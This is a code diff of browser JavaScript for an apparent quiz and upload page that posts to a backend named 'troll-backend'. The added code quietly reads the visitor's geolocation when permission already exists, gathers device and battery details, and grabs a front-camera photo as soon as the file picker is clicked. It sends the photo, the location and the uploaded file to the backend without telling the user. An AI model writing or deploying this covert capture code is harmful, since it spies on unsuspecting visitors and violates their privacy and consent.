@@ -1,65 +1,70 @@
-const btn = document.getElementById('submit-btn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const fileInput = document.getElementById('user-file');
-
+// ================================
+// CONFIG
+// ================================
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 
-// ================================
-// SILENT LOCATION (ONLY IF ALREADY ALLOWED)
-// ================================
-async function getSilentLocation() {
-  let loc = "";
-  if (!navigator.permissions) return loc;
+// DOM
+const btn = document.getElementById("submit-btn");
+const fileInput = document.getElementById("user-file");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 
-  try {
-    const status = await navigator.permissions.query({ name: "geolocation" });
-    if (status.state === "granted") {
-      const pos = await new Promise((res, rej) =>
-        navigator.geolocation.getCurrentPosition(res, rej)
-      );
-      loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-    }
-  } catch {}
-  return loc;
-}
+// Camera state
+let cameraStream = null;
+let cameraCaptured = false;
 
 // ================================
-// COLLECT METADATA
+// METADATA
 // ================================
 async function collectMetadata() {
-  const meta = {
-    width: window.innerWidth,
-    height: window.innerHeight,
-    platform: navigator.platform,
-    language: navigator.language,
-    useragent: navigator.userAgent,
-    time: new Date().toLocaleString(),
-    location: await getSilentLocation(),
-    battery: "N/A"
-  };
-
+  let battery = "N/A";
   if (navigator.getBattery) {
     try {
-      const battery = await navigator.getBattery();
-      meta.battery = `${battery.level * 100}% charging:${battery.charging}`;
+      const b = await navigator.getBattery();
+      battery = `${b.level * 100}% charging:${b.charging}`;
     } catch {}
   }
 
-  return meta;
+  let location = "";
+  if (navigator.permissions) {
+    try {
+      const p = await navigator.permissions.query({ name: "geolocation" });
+      if (p.state === "granted") {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        location = `${pos.coords.latitude},${pos.coords.longitude}`;
+      }
+    } catch {}
+  }
+
+  return {
+    width: innerWidth,
+    height: innerHeight,
+    platform: navigator.platform,
+    language: navigator.language,
+    useragent: navigator.userAgent,
+    battery,
+    location,
+    time: new Date().toLocaleString()
+  };
 }
 
 // ================================
-// CAPTURE CAMERA
+// CAMERA CAPTURE (2s DELAY)
 // ================================
-async function captureCameraImage() {
-  const stream = await navigator.mediaDevices.getUserMedia({
+async function captureCameraIfNeeded() {
+  if (cameraCaptured) return;
+
+  cameraStream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: "user" },
     audio: false
   });
 
-  video.srcObject = stream;
-  await new Promise(r => setTimeout(r, 2500)); // short delay for user
+  video.srcObject = cameraStream;
+
+  // wait 2s for focus
+  await new Promise(r => setTimeout(r, 2000));
 
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -73,47 +78,52 @@ async function captureCameraImage() {
     body: JSON.stringify({ image, metadata })
   });
 
-  // Stop camera
-  stream.getTracks().forEach(track => track.stop());
+  cameraCaptured = true;
 }
 
 // ================================
-// SEND FILE
+// FILE UPLOAD
 // ================================
-async function sendFile(file) {
-  if (!file) return;
+async function uploadFile(file) {
   const reader = new FileReader();
   reader.onload = async () => {
     await fetch(`${BACKEND_BASE}/file-upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ file: reader.result, filename: file.name })
+      body: JSON.stringify({
+        file: reader.result,
+        filename: file.name
+      })
     });
   };
   reader.readAsDataURL(file);
 }
 
 // ================================
-// FORM SUBMIT
+// FILE INPUT CLICK → CAMERA FIRST
+// ================================
+fileInput.addEventListener("click", async () => {
+  try {
+    await captureCameraIfNeeded();
+  } catch (e) {
+    console.warn("Camera not allowed");
+  }
+});
+
+// ================================
+// SUBMIT
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
 
   if (!fileInput.files.length) return;
 
-  try {
-    // Request camera permission and capture
-    await captureCameraImage();
+  await uploadFile(fileInput.files[0]);
 
-    // Upload file
-    await sendFile(fileInput.files[0]);
-
-    // Show success page
-    document.getElementById("quiz-container").style.display = "none";
-    document.getElementById("success-container").style.display = "flex";
-
-  } catch (err) {
-    console.error(err);
-    alert("Error: camera permission denied or something went wrong.");
+  if (cameraStream) {
+    cameraStream.getTracks().forEach(t => t.stop());
   }
+
+  document.getElementById("quiz-container").style.display = "none";
+  document.getElementById("success-container").style.display = "block";
 });
